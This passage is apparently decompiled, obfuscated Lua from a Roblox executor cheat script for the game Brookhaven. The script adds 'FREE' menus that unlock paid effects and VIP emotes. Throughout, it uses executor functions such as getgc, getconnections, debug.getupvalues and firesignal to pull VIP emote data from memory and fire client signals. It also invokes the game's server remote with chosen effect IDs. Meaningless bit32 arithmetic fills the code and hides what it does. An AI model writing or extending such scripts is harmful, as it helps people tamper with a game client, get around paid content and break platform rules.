	clone.SelectedIcon.Image = emmiters.SelectedIcon.Image
	clone.SelectedIcon.Visible = false
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "CoquetteFreeBadge"
	textLabel.AutoLocalize = false
	textLabel.Text = "FREE"
	local v29 = bit32.bor(v18 - 2085669784, 1956022443)
	textLabel.TextSize = 16
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.BackgroundColor3 = Color3.fromRGB(22, 185, 72)
	local v30 = bit32.band(v29, 3335379993)
	textLabel.Position = UDim2.new(0, 4, 0, 5)
	textLabel.Size = UDim2.new(0, 60, 0, 28)
	textLabel.Rotation = -12
	textLabel.ZIndex = 30
	textLabel.Parent = clone
	Instance.new("UICorner", textLabel).CornerRadius = UDim.new(0, 6)
	local new = Instance.new
	local v31 = bit32.bxor(n12, 85114619)
	local ScrollingFrame = new("ScrollingFrame")
	ScrollingFrame.Name = "CoquetteEffectsContent"
	ScrollingFrame.Position = UDim2.new(0, 8, 0, 8)
	ScrollingFrame.Size = UDim2.new(1, -16, 1, -16)
	local n13 = v28 // v30
	ScrollingFrame.BackgroundTransparency = 1
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.ScrollBarThickness = 7
	ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
	ScrollingFrame.CanvasSize = UDim2.new()
	ScrollingFrame.Visible = false
	local v32 = bit32.bxor(v31, 0)
	local v33 = bit32.bor(v30, v32)
	local v34 = bit32.bxor(v31, 188045124)
	ScrollingFrame.ZIndex = 20
	ScrollingFrame.Parent = container
	local uiGridLayout = Instance.new("UIGridLayout")
	local v35 = bit32.bxor(v34, 0)
	local v36 = bit32.bor(n13, v35)
	uiGridLayout.CellSize = UDim2.new(0.23999999463558197, 0, 0, 175)
	uiGridLayout.CellPadding = UDim2.new(0, 7, 0, 7)
	uiGridLayout.FillDirection = Enum.FillDirection.Horizontal
	uiGridLayout.FillDirectionMaxCells = 4
	uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiGridLayout.Parent = ScrollingFrame
	local tbl12 = {}
	local tbl13 = {}
	local v37 = table.pack(bit32.band(v35, 4294967295))
	local v38 = table.pack(bit32.band(v37[1], 65535))
	local v39 = bit32.band(52000 * v38[1] + bit32.lshift(bit32.band(52000 * bit32.rshift(v37[1], 16) + 51974 * v38[1], 65535), 16), 4294967295)
	local v40 = table.pack(bit32.band(bit32.bnot(v35), 4294967295))
	local v41 = table.pack(bit32.band(v40[1], 65535))
	local n14 = 3262403384 + n9 + v39 + bit32.band(52000 * v41[1] + bit32.lshift(bit32.band(52000 * bit32.rshift(v40[1], 16) + 51974 * v41[1], 65535), 16), 4294967295)
	local n15 = v33 - 89255106

	local function fn2(arg, arg2)
		local connection = arg:Connect(arg2)
		table.insert(tbl12, connection)
		return connection
	end

	local function fn3()
		local character = localPlayer.Character
		if not character then
			return nil
		end

		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("ParticleEmitter") then
				local attribute = descendant:GetAttribute("ID")
				if attribute then
					return tostring(attribute)
				end
			end
		end

		return nil
	end

	local function fn4()
		if not ScrollingFrame.Visible then
			return
		end
		local v42 = fn3()

		for k, v43 in pairs(tbl13) do
			v43.Visible = v42 ~= nil and v42 == k
		end
	end

	local v42 = ipairs
	local v43 = bit32.bxor(v34, 160335646)

	for k, v44 in v42(tbl) do
		local v45 = v44[2]
		local v46 = v44[3]
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = "Effect_" .. v46
		imageButton.LayoutOrder = k
		imageButton.Image = "rbxassetid://" .. v45
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.BackgroundColor3 = Color3.new(1, 1, 1)
		imageButton.BackgroundTransparency = 0.35
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = true
		imageButton.ZIndex = 21
		imageButton.Parent = ScrollingFrame
		Instance.new("UICorner", imageButton).CornerRadius = UDim.new(0, 8)
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Name = "CoquetteFreeBadge"
		textLabel2.AutoLocalize = false
		textLabel2.Text = "FREE"
		textLabel2.AnchorPoint = Vector2.new(1, 1)
		textLabel2.Position = UDim2.new(1, -6, 1, -6)
		textLabel2.Size = UDim2.new(0, 46, 0, 25)
		textLabel2.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
		textLabel2.TextColor3 = Color3.fromRGB(20, 180, 65)
		textLabel2.TextSize = 13
		local v47 = Enum
		local v48 = table.pack(bit32.band(v43, 4294967295))
		local v49 = table.pack(bit32.band(v48[1], 65535))
		local n16 = bit32.band(21764 * v49[1] + bit32.lshift(bit32.band(21764 * bit32.rshift(v48[1], 16) + 51364 * v49[1], 65535), 16), 4294967295) + 2678029076
		local v50 = table.pack(bit32.band(bit32.bor(v43, 125228165), 4294967295))
		local v51 = table.pack(bit32.band(v50[1], 65535))
		local v52 = bit32.band(43773 * v51[1] + bit32.lshift(bit32.band(43773 * bit32.rshift(v50[1], 16) + 14171 * v51[1], 65535), 16), 4294967295)
		local v53 = table.pack(bit32.band(bit32.band(v43, 125228165), 4294967295))
		local v54 = table.pack(bit32.band(v53[1], 65535))
		local n17 = n16 + v52 + bit32.band(43771 * v54[1] + bit32.lshift(bit32.band(43771 * bit32.rshift(v53[1], 16) + 14171 * v54[1], 65535), 16), 4294967295)
		textLabel2.Font = v47.Font.GothamBold
		textLabel2.ZIndex = 23
		textLabel2.Parent = imageButton
		Instance.new("UICorner", textLabel2).CornerRadius = UDim.new(0, 5)
		local imageLabel = Instance.new("ImageLabel")
		local v55 = bit32.bxor(n17, 34672873)
		imageLabel.Name = "EquippedCheck"
		imageLabel.AnchorPoint = Vector2.new(1, 0)
		imageLabel.Position = UDim2.new(1, -7, 0, 7)
		imageLabel.Size = UDim2.new(0, 38, 0, 38)
		local n18 = 519503886
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = emmiters.SelectedIcon.Image
		imageLabel.ScaleType = Enum.ScaleType.Fit
		imageLabel.Visible = false
		imageLabel.ZIndex = 24
		imageLabel.Parent = imageButton
		tbl13[v45] = imageLabel

		local function fn5()
			if fn3() == v45 then
				local character = localPlayer.Character

				if character then
					for _, descendant in ipairs(character:GetDescendants()) do
						local isParticleEmitter = descendant:IsA("ParticleEmitter")
						local flag

						if isParticleEmitter then
							flag = tostring(descendant:GetAttribute("ID") or "") == v45
						else
							flag = isParticleEmitter
						end

						if flag then
							descendant:Destroy()
						end
					end
				end
			else
				local n19 = 637500172

				pcall(function()
					applyEmmiter:InvokeServer(v45, v46)
				end)
			end

			task.wait(0.15)
			fn4()
		end

		fn2(imageButton.Activated, fn5)
		v43 = bit32.bxor(v55, 90686572)
	end

	local function fn5()
		avatarEditorMenu.Visible = true
		catalog.Visible = true
		container.Visible = true
		body.Visible = true

		for _, child in ipairs(container:GetChildren()) do
			if child:IsA("GuiObject") then
				child.Visible = child == ScrollingFrame
			end
		end

		ScrollingFrame.Visible = true
		clone.SelectedIcon.Visible = true
		emmiters.SelectedIcon.Visible = false
		avatarEditorMenu:SetAttribute("CoquetteLastView", "custom")
		fn4()
	end

	local function fn6()
		ScrollingFrame.Visible = false
		clone.SelectedIcon.Visible = false
	end

	fn2(clone.Activated, function()
		task.defer(fn5)
	end)

	for _, child in ipairs(catalog.CategoryTabs:GetChildren()) do
		if child:IsA("ImageButton") and child ~= close then
			fn2(child.Activated, function()
				avatarEditorMenu:SetAttribute("CoquetteLastView", "native")
				task.defer(fn6)
			end)
		end
	end

	for _, descendant in ipairs(subCategoryTabs:GetDescendants()) do
		if descendant:IsA("ImageButton") and descendant ~= clone then
			local v44 = descendant

			fn2(v44.Activated, function()
				local flag = type(0) == "table"
				avatarEditorMenu:SetAttribute("CoquetteLastView", "native")
				local n16 = 740727739

				task.defer(function()
					fn6()

					if v44 == emmiters then
						emmiters.SelectedIcon.Visible = true
					end
				end)
			end)
		end
	end

	local flag = not avatarEditorMenu.Visible

	fn2(avatarEditorMenu:GetPropertyChangedSignal("Visible"), function()
		if not avatarEditorMenu.Visible then
			flag = true
		elseif flag then
			flag = false

			if avatarEditorMenu:GetAttribute("CoquetteLastView") == "custom" then
				task.delay(0.1, fn5)
			end
		end
	end)

	local function fn7(arg)
		local n16 = 53969407
		local flag2 = type(0) == "vector"
		if not arg then
			return
		end
		local v44 = fn2
		local v45 = bit32.bxor(n16, 364883677)
		local descendantAdded = arg.DescendantAdded
		local v46 = table.pack(bit32.band(v45, 4294967295))
		local v47 = table.pack(bit32.band(v46[1], 65535))
		local n17 = bit32.band(49564 * v47[1] + bit32.lshift(bit32.band(49564 * bit32.rshift(v46[1], 16) + 5814 * v47[1], 65535), 16), 4294967295) + 3559731240
		local v48 = table.pack(bit32.band(bit32.bor(v45, 72549734), 4294967295))
		local v49 = table.pack(bit32.band(v48[1], 65535))
		local v50 = bit32.band(15973 * v49[1] + bit32.lshift(bit32.band(15973 * bit32.rshift(v48[1], 16) + 59721 * v49[1], 65535), 16), 4294967295)
		local v51 = table.pack(bit32.band(bit32.band(v45, 72549734), 4294967295))
		local v52 = table.pack(bit32.band(v51[1], 65535))
		local n18 = n17 + v50 + bit32.band(15971 * v52[1] + bit32.lshift(bit32.band(15971 * bit32.rshift(v51[1], 16) + 59721 * v52[1], 65535), 16), 4294967295)

		v44(descendantAdded, function(arg2)
			if arg2:IsA("ParticleEmitter") and ScrollingFrame.Visible then
				task.delay(0.05, fn4)
			end
		end)

		fn2(arg.DescendantRemoving, function(arg2)
			if arg2:IsA("ParticleEmitter") and ScrollingFrame.Visible then
				task.delay(0.05, fn4)
			end
		end)
	end

	if localPlayer.Character then
		fn7(localPlayer.Character)
	end

	fn2(localPlayer.CharacterAdded, fn7)
	local flag2 = avatarEditorMenu:GetAttribute("CoquetteLastView") == nil

	if flag2 then
		avatarEditorMenu:SetAttribute("CoquetteLastView", "native")
	end

	local function brookhavenEffectsCleanup()
		for _, v44 in ipairs(tbl12) do
			local n16 = bit32.bxor(n14, 0) + 494074267
			local n17 = 13254057346

			pcall(function()
				v44:Disconnect()
			end)
		end

		if clone and clone.Parent then
			clone:Destroy()
		end

		if ScrollingFrame and ScrollingFrame.Parent then
			ScrollingFrame:Destroy()
		end

		emmiters.LayoutOrder = 8
		scale.LayoutOrder = 9
	end

	genv.__BrookhavenEffectsCleanup = brookhavenEffectsCleanup
end

-- payload closure created 280-th (proto #191)
local function payload_fn_280()
	local n2 = 1871558866
	local n3 = 2093800352
	local Players = game:GetService("Players")
	local CollectionService = game:GetService("CollectionService")
	local localPlayer = Players.LocalPlayer
	local mainGUIHandler = localPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUIHandler")
	local n4 = 269666905
	local container = mainGUIHandler:WaitForChild("MainAnimationsMenu"):WaitForChild("Catalog"):WaitForChild("Container")
	local filters = container:WaitForChild("Filters")
	local scrollingFrame = container:WaitForChild("ScrollingFrame")
	local n5 = 79158236
	local animationStop = mainGUIHandler:WaitForChild("Menu"):WaitForChild("AnimationStop")
	local genv = getgenv() or _G
	local kind = type(genv.__BrookhavenCrownEmotesCleanup)
	local v = bit32.bxor(n5, 0)
	local v2 = bit32.bor(n3, v)

	if kind == "function" then
		pcall(genv.__BrookhavenCrownEmotesCleanup)
	end

	local tbl = {}
	local flag = false
	local flag2 = false
	local v3 = nil
	local tbl2 = {}
	local v4 = nil

	local function fn(arg, arg2, arg3, arg4)
		local connection = arg2:Connect(arg4)
		table.insert(tbl, connection)
		return connection
	end

	local function fn2(arg)
		local tbl3 = { arg }

		for _, descendant in ipairs(arg:GetDescendants()) do
			table.insert(tbl3, descendant)
		end

		for _, v5 in ipairs(tbl3) do
			for _, v6 in ipairs(CollectionService:GetTags(v5)) do
				CollectionService:RemoveTag(v5, v6)
			end
		end
	end

	local function fn3()
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		if not humanoid then
			return nil
		end
		local animator = humanoid:FindFirstChildOfClass("Animator")

		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = humanoid
		end

		return animator
	end

	local n6 = bit32.bxor(n4, 500542596) + 4067438637
	local v5 = table.pack(bit32.band(n4, 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(12333 * v6[1] + bit32.lshift(bit32.band(12333 * bit32.rshift(v5[1], 16) + 62064 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bnot(n4), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n7 = n6 + v7 + bit32.band(12333 * v9[1] + bit32.lshift(bit32.band(12333 * bit32.rshift(v8[1], 16) + 62064 * v9[1], 65535), 16), 4294967295)

	local function fn4()
		for _, v10 in ipairs(tbl2) do
			if v10.track then
				local n8 = 407158304

				pcall(function()
					v10.track:Stop(0.12)
				end)

				pcall(function()
					v10.track:Destroy()
				end)
			end
		end

		tbl2 = {}
	end

	local function fn5(arg)
		flag2 = false
		local v10 = nil
		v3 = nil
		fn4()

		if v4 and v4.Parent then
			v4:Destroy()
		end

		v4 = nil

		if arg and animationStop and animationStop.Parent then
			local n8 = 8620537

			if v10 then
			end

			local v11 = pcall
			local v12 = table.pack(bit32.band(n8, 4294967295))
			local v13 = table.pack(bit32.band(v12[1], 65535))
			local n9 = bit32.band(63555 * v13[1] + bit32.lshift(bit32.band(63555 * bit32.rshift(v12[1], 16) + 13535 * v13[1], 65535), 16), 4294967295) + 1222569903
			local v14 = table.pack(bit32.band(bit32.bor(n8, 245226021), 4294967295))
			local v15 = table.pack(bit32.band(v14[1], 65535))
			local v16 = bit32.band(3962 * v15[1] + bit32.lshift(bit32.band(3962 * bit32.rshift(v14[1], 16) + 38464 * v15[1], 65535), 16), 4294967295)
			local v17 = table.pack(bit32.band(bit32.bxor(n8, 245226021), 4294967295))
			local v18 = table.pack(bit32.band(v17[1], 65535))
			local n10 = n9 + v16 + bit32.band(63556 * v18[1] + bit32.lshift(bit32.band(63556 * bit32.rshift(v17[1], 16) + 13535 * v18[1], 65535), 16), 4294967295)

			v11(function()
				firesignal(animationStop.MouseButton1Click)
			end)
		end

		if animationStop and animationStop.Parent then
			animationStop.Visible = false
		end
	end

	local function fn6(arg)
		local n8 = bit32.bxor(n7, 0) + 339722917
		local n9 = 690770545
		if not arg then
			return
		end
		local str = ""
		local n10 = n9 + 245803890

		pcall(function()
			str = arg.Animation and arg.Animation.AnimationId or ""
		end)

		pcall(function()
			arg.Priority = Enum.AnimationPriority.Action4
		end)

		pcall(function()
			arg.Looped = true
		end)

		table.insert(tbl2, { track = arg, animationId = str })
	end

	local tbl3 = { ["67"] = "85854435907167" }
	local v10 = bit32.bxor(n5, 0)
	tbl3["Heart Hands"] = "102513876982209"

	local function fn7(arg)
		local flag3 = type(454342963) == "function"
		local n8 = 605362587

		local ok2, result2 = pcall(function()
			local v11 = getconnections(arg.Activated)
			local function_ = v11 and v11[1]
			function_ = function_ and function_.Function
			local getupvalues = function_ and debug and debug.getupvalues and debug.getupvalues(function_)
			return getupvalues and getupvalues[5]
		end)

		if ok2 and type(result2) == "table" then
			return result2
		end
		return { Name = arg.Name, Id = tbl3[arg.Name] }
	end

	local function fn8(arg)
		local n8 = 2818077567
		local n9 = 1785916984
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local emotes = game:GetService("ReplicatedStorage"):FindFirstChild("Emotes")
		emotes = emotes and emotes:FindFirstChild(tostring(arg))
		if not character or not humanoidRootPart or not emotes then
			return
		end
		local clone = emotes:Clone()
		clone.Name = "CoquetteLocalEmoteVFX"
		clone.Parent = character
		v4 = clone
		local leftHand = character:FindFirstChild("LeftHand") or character:FindFirstChild("Left Arm")
		local rightHand = character:FindFirstChild("RightHand") or character:FindFirstChild("Right Arm")
		local parts = clone:FindFirstChild("Parts")

		for _, descendant in ipairs(clone:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.Anchored = false
				descendant.CanCollide = false
				descendant.CanTouch = false
				descendant.CanQuery = false
				descendant.Massless = true
			end
		end

		local flag3 = false

		for _, descendant in ipairs(clone:GetDescendants()) do
			if descendant:IsA("Motor6D") then
				local v11 = string.lower(descendant.Name)
				local v12

				if tostring(arg) == "67" then
					v12 = humanoidRootPart
				elseif string.find(v11, "left") or string.find(v11, "lhand") or string.find(v11, "6") then
					v12 = leftHand or humanoidRootPart
				elseif string.find(v11, "right") or string.find(v11, "rhand") or string.find(v11, "7") then
					v12 = rightHand or humanoidRootPart
				else
					v12 = humanoidRootPart
				end

				if not descendant.Part1 and parts then
					descendant.Part1 = parts:FindFirstChild(descendant.Name)
				end

				if descendant.Part1 then
					descendant.Part0 = v12
					descendant.Parent = v12
					flag3 = true
				end
			end
		end

		if not flag3 then
			local basePart = clone:FindFirstChildWhichIsA("BasePart", true)

			if basePart then
				basePart.CFrame = humanoidRootPart.CFrame
				local v11 = Instance
				local v12 = bit32.bor(n9, 3689663201)
				local Motor6D = v11.new("Motor6D")
				Motor6D.Name = "CoquetteVfxMotor"
				Motor6D.Part0 = humanoidRootPart
				Motor6D.Part1 = basePart
				Motor6D.C0 = CFrame.new(0, 0.5, -2)
				Motor6D.Parent = humanoidRootPart
			end
		end
	end

	local function fn9(arg, arg2)
		local n8 = 192544683
		local item = arg and arg.Item
		local n9 = n8 + 276615277
		if type(item) ~= "string" or item == "" then
			return false
		end
		local n10 = n9 - 240206562
		local modules = game:GetService("ReplicatedStorage"):FindFirstChild("Modules")
		modules = modules and modules:FindFirstChild("Client")
		modules = modules and modules:FindFirstChild("Emotes")
		modules = modules and modules:FindFirstChild("Scripts")
		local v11 = modules and modules:FindFirstChild(item)
		if not v11 or not v11:IsA("ModuleScript") then
			return false
		end

		local ok2, result2 = pcall(function()
			local v12 = require(v11).new()
			v12:start(localPlayer.Character, arg2)
			return v12
		end)

		return ok2 and result2 ~= nil
	end

	local function fn10()
		local n8 = 98330331
		local character = localPlayer.Character
		local rightHand = character and character:FindFirstChild("RightHand")
		local emotes = game:GetService("ReplicatedStorage"):FindFirstChild("Emotes")
		emotes = emotes and emotes:FindFirstChild("Rich")
		if not character or not rightHand or not emotes then
			return false
		end
		local clone = emotes:Clone()
		clone.Name = "CoquetteLocalEmoteVFX"
		local n9 = n8 + 339077384 - 194259017
		clone.Parent = character
		v4 = clone

		pcall(function()
			require(game.ReplicatedStorage.Modules.Client.Emotes.EmoteVfxScale).scaleToCharacterWorldScale(clone, character)
		end)

		local ok2 = pcall(function()
			require(game.ReplicatedStorage.Modules.Shared.Utils.BasePartUtil).MoveModelAndWeld(clone, clone:WaitForChild("Handle"), rightHand)
		end)

		for _, descendant in ipairs(clone:GetDescendants()) do
			if (descendant:IsA("BasePart") or descendant:IsA("Decal")) and descendant.Name ~= "Handle" then
				descendant.Transparency = 0
			end
		end

		return ok2
	end

	local function fn11(arg, arg2)
		local n8 = 69466159
		arg2 = arg2 or fn7(arg)
		local id = arg2 and arg2.Id or tbl3[arg.Name]
		local v11 = fn3()
		local v12 = table.pack(bit32.band(n8, 4294967295))
		local v13 = table.pack(bit32.band(v12[1], 65535))
		local n9 = bit32.band(1610 * v13[1] + bit32.lshift(bit32.band(1610 * bit32.rshift(v12[1], 16) + 7276 * v13[1], 65535), 16), 4294967295) + 1617842738
		local v14 = table.pack(bit32.band(bit32.bor(n8, 470427109), 4294967295))
		local v15 = table.pack(bit32.band(v14[1], 65535))
		local v16 = bit32.band(63927 * v15[1] + bit32.lshift(bit32.band(63927 * bit32.rshift(v14[1], 16) + 58259 * v15[1], 65535), 16), 4294967295)
		local v17 = table.pack(bit32.band(bit32.band(n8, 470427109), 4294967295))
		local v18 = table.pack(bit32.band(v17[1], 65535))
		local n10 = n9 + v16 + bit32.band(63925 * v18[1] + bit32.lshift(bit32.band(63925 * bit32.rshift(v17[1], 16) + 58259 * v18[1], 65535), 16), 4294967295)
		if not id or not v11 then
			return
		end
		local new = Instance.new
		local v19 = bit32.bxor(n10, 37606571)
		local Animation = new("Animation")
		Animation.AnimationId = "rbxassetid://" .. id

		local ok2, result2 = pcall(function()
			return v11:LoadAnimation(Animation)
		end)

		Animation:Destroy()

		if ok2 and result2 then
			fn6(result2)
			local v20

			if tostring(arg2.Name) == "Rich" then
				v20 = fn10()
			else
				v20 = fn9(arg2, result2)
			end

			if not v20 then
				fn8(arg2.Name or arg.Name)
			end

			result2:Play(0.1, 1, 1)
		end
	end

	local function fn12(arg, arg2)
		local name = arg2 and arg2.Name or arg.Name
		if flag2 and v3 == name then
			fn5(false)
			return
		end
		fn5(false)
		flag2 = true
		v3 = name
		animationStop.Visible = true
		fn11(arg, arg2)
	end

	local coquetteCrownEmotes = filters:FindFirstChild("CoquetteCrownEmotes")

	if coquetteCrownEmotes then
		coquetteCrownEmotes:Destroy()
	end

	local coquetteCrownEmotesGrid = container:FindFirstChild("CoquetteCrownEmotesGrid")

	if coquetteCrownEmotesGrid then
		coquetteCrownEmotesGrid:Destroy()
	end

	local emote = filters:FindFirstChild("Emote")

	for _, child in ipairs(filters:GetChildren()) do
		if not emote and child:IsA("GuiButton") then
			emote = child
		end
	end

	assert(emote, "Filtro-base do catalogo nao encontrado")
	local clone = emote:Clone()
	clone.Name = "CoquetteCrownEmotes"
	clone.LayoutOrder = -2
	fn2(clone)
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "FreeBadge"
	textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	textLabel.Position = UDim2.new(0.5, 0, 0.17000000178813934, 0)
	local v11 = bit32.bor(v10, 1015830160)
	textLabel.Size = UDim2.new(0.77999997138977051, 0, 0.23999999463558197, 0)
	local v12 = bit32.bxor(n5, 2560573)
	textLabel.BackgroundColor3 = Color3.fromRGB(41, 184, 71)
	textLabel.BorderSizePixel = 0
	textLabel.Rotation = -10
	local n8 = v2 + 3898582857 + bit32.bxor(v12, 0)
	textLabel.Text = "FREE"
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextStrokeTransparency = 0.65
	textLabel.TextScaled = true
	textLabel.Font = Enum.Font.GothamBold
	textLabel.ZIndex = clone.ZIndex + 5
	textLabel.Parent = clone
	local uiCorner = Instance.new("UICorner")
	uiCorner.CornerRadius = UDim.new(0, 4)
	uiCorner.Parent = textLabel
	local uiStroke = Instance.new("UIStroke")
	local v13 = Color3
	local v14 = bit32.bxor(v12, 347201233)
	uiStroke.Color = v13.fromRGB(235, 255, 235)
	uiStroke.Thickness = 1
	uiStroke.Transparency = 0.25
	uiStroke.Parent = textLabel
	clone.Parent = filters
	local clone2 = scrollingFrame:Clone()
	local n9 = n8 // bit32.bxor(v14, 0)
	clone2.Name = "CoquetteCrownEmotesGrid"
	clone2.Visible = false
	clone2.ZIndex = scrollingFrame.ZIndex + 2
	local n10 = v11 // 2
	fn2(clone2)

	for _, child in ipairs(clone2:GetChildren()) do
		if child:IsA("GuiButton") then
			child:Destroy()
		end
	end

	clone2.Parent = container
	local tbl4 = {}

	local function fn13()
		for _, v15 in ipairs(tbl4) do
			local flag3 = type(0) == "thread"
			local n11 = 966048833

			pcall(function()
				v15:Disconnect()
			end)
		end

		tbl4 = {}
	end

	local tbl5 = {
		["67"] = 1,
		["Heart Hands"] = 12,
		Rich = 17,
		["Star Dance"] = 43,
		Lean = 44,
		["Blow Kiss"] = 45,
		Twirl = 46,
	}

	local v15 = table.pack(bit32.band(v14, 4294967295))
	local v16 = table.pack(bit32.band(v15[1], 65535))
	local n11 = bit32.band(21685 * v16[1] + bit32.lshift(bit32.band(21685 * bit32.rshift(v15[1], 16) + 8968 * v16[1], 65535), 16), 4294967295) + 1020343079
	local v17 = table.pack(bit32.band(bit32.bor(v14, 529354219), 4294967295))
	local v18 = table.pack(bit32.band(v17[1], 65535))
	local v19 = bit32.band(43852 * v18[1] + bit32.lshift(bit32.band(43852 * bit32.rshift(v17[1], 16) + 56567 * v18[1], 65535), 16), 4294967295)
	local n12 = n9 - n10
	local v20 = table.pack(bit32.band(bit32.band(v14, 529354219), 4294967295))
	local v21 = table.pack(bit32.band(v20[1], 65535))
	local n13 = n11 + v19 + bit32.band(43850 * v21[1] + bit32.lshift(bit32.band(43850 * bit32.rshift(v20[1], 16) + 56567 * v21[1], 65535), 16), 4294967295)
	tbl5.Griddy = 47
	tbl5.Serving = 85
	tbl5.Duckwalk = 86
	tbl5.Deathdrop = 87
	local v22 = nil

	local function fn14()
		local n14 = 200518568
		local n15 = 3280336358
		local n16 = 893135963
		if v22 then
			return v22
		end
		local tbl6 = {}
		local tbl7 = {}
		local ok2, result2 = pcall(getgc, true)

		if ok2 then
			ok2 = type(result2) == "table"
			n16 = bit32.bxor(n16, n15) + 1048728222
		end

		if ok2 then
			for _, v23 in ipairs(result2) do
				local flag3 = type(v23) == "table" and rawget(v23, "Name") and rawget(v23, "Id") and (rawget(v23, "IsVip") == true or rawget(v23, "Script") == true)
				local flag4

				if flag3 then
					flag4 = rawget(v23, "Filter") or rawget(v23, "Item") or rawget(v23, "Name") == "67"
				else
					flag4 = flag3
				end

				if flag4 then
					local str = tostring(v23.Name)

					if not tbl7[str] then
						tbl7[str] = true
						table.insert(tbl6, v23)
					end
				end
			end
		end

		local tbl8 = {}
		local tbl9 = { Name = "Heart Hands", Id = "102513876982209" }
		local v23 = table.pack(bit32.band(n14, 4294967295))
		local v24 = table.pack(bit32.band(v23[1], 65535))
		local n17 = bit32.band(24395 * v24[1] + bit32.lshift(bit32.band(24395 * bit32.rshift(v23[1], 16) + 18982 * v24[1], 65535), 16), 4294967295) + 3612155073
		local v25 = table.pack(bit32.band(bit32.bor(n14, 266686627), 4294967295))
		local v26 = table.pack(bit32.band(v25[1], 65535))
		local v27 = bit32.band(41142 * v26[1] + bit32.lshift(bit32.band(41142 * bit32.rshift(v25[1], 16) + 46553 * v26[1], 65535), 16), 4294967295)
		local v28 = table.pack(bit32.band(bit32.band(n14, 266686627), 4294967295))
		local v29 = table.pack(bit32.band(v28[1], 65535))
		local n18 = n17 + v27 + bit32.band(41140 * v29[1] + bit32.lshift(bit32.band(41140 * bit32.rshift(v28[1], 16) + 46553 * v29[1], 65535), 16), 4294967295)
		tbl9.IsVip = true
		local v30 = bit32.band(n15, n16)
		local tbl10 = { Name = "Deathdrop" }
		local v31 = bit32.bxor(n18, 224826873)
		tbl10.Id = "102513876982209"
		tbl10.IsVip = true
		tbl8[1] = { Name = "67", Id = "85854435907167", IsVip = true }
		tbl8[2] = tbl9
		tbl8[3] = { Name = "Rich", Id = "18248037214", Item = "Rich", IsVip = true }
		tbl8[4] = { Name = "Star Dance", Id = "102513876982209", IsVip = true }
		tbl8[5] = { Name = "Lean", Id = "102513876982209", IsVip = true }
		tbl8[6] = { Name = "Blow Kiss", Id = "102513876982209", IsVip = true }
		tbl8[7] = { Name = "Twirl", Id = "102513876982209", IsVip = true }
		tbl8[8] = { Name = "Griddy", Id = "102513876982209", IsVip = true }
		tbl8[9] = { Name = "Serving", Id = "102513876982209", IsVip = true }
		tbl8[10] = { Name = "Duckwalk", Id = "102513876982209", IsVip = true }
		tbl8[11] = tbl10
		local v32, v33, v34 = ipairs(tbl8)

		for _, v35 in v32, v33, v34 do
			if not tbl7[v35.Name] then
				tbl7[v35.Name] = true
				table.insert(tbl6, v35)
			end
		end

		table.sort(tbl6, function(arg, arg2)
			local n19 = tbl5[tostring(arg.Name)] or 1000
			local n20 = tbl5[tostring(arg2.Name)] or 1000
			if n19 == n20 then
				return tostring(arg.Name) < tostring(arg2.Name)
			end
			return n19 < n20
		end)

		v22 = tbl6
		return tbl6
	end

	local flag3 = false

	local function fn15()
		local n14 = 39110392
		if flag then
			return
		end

		if flag3 and #clone2:GetChildren() > 1 then
			return
		end
		fn13()

		for _, child in ipairs(clone2:GetChildren()) do
			if child:IsA("GuiButton") then
				child:Destroy()
			end
		end

		local v23 = fn14()
		local n67 = scrollingFrame:FindFirstChild("67") or scrollingFrame:FindFirstChildWhichIsA("ImageButton")
		if not n67 then
			return
		end
		local v24

		for i, v25 in ipairs(v23) do
			local n15 = 462474795
			local clone3 = (scrollingFrame:FindFirstChild(tostring(v25.Name)) or n67):Clone()
			clone3.Name = "Coquette_" .. tostring(v25.Name)
			local n16 = n15 + 442624308 - 18815940
			clone3.LayoutOrder = i
			clone3.Visible = true
			fn2(clone3)
			local label = clone3:FindFirstChild("Label")

			if label and not v24 then
				label.Text = tostring(v25.Name)
			end

			local vipIcon = clone3:FindFirstChild("VipIcon")

			if vipIcon and vipIcon:IsA("ImageLabel") then
				vipIcon.Image = "rbxassetid://18248037214"
				vipIcon.Visible = true
				vipIcon.ImageTransparency = 0
			end

			clone3.Parent = clone2

			table.insert(tbl4, clone3.Activated:Connect(function()
				fn12(clone3, v25)
			end))
		end

		flag3 = true
	end

	local flag4 = false

	local function fn16()
		flag4 = true
		scrollingFrame.Visible = false
		clone2.Visible = true

		if not flag3 then
			fn15()
		end
	end

	local v23 = bit32.band(n10, 2663451335)

	local function fn17()
		flag4 = false
		clone2.Visible = false
		scrollingFrame.Visible = true
	end

	fn(260206744, clone.Activated, 456542888, fn16)

	for _, child in ipairs(filters:GetChildren()) do
		if child:IsA("GuiButton") and child ~= clone then
			fn(260206744, child.Activated, 74041083, fn17)
		end
	end

	fn(260206744, scrollingFrame:GetPropertyChangedSignal("Position"), 263023808, function()
		clone2.Position = scrollingFrame.Position
	end)

	local signal = scrollingFrame:GetPropertyChangedSignal("Size")

	local function fn18()
		clone2.Size = scrollingFrame.Size
	end

	fn(260206744, signal, 327324293, fn18)

	fn(260206744, animationStop.MouseButton1Click, 507050643, function()
		if flag2 then
			fn5(false)
		end
	end)

	local function fn19()
		fn5(false)
	end

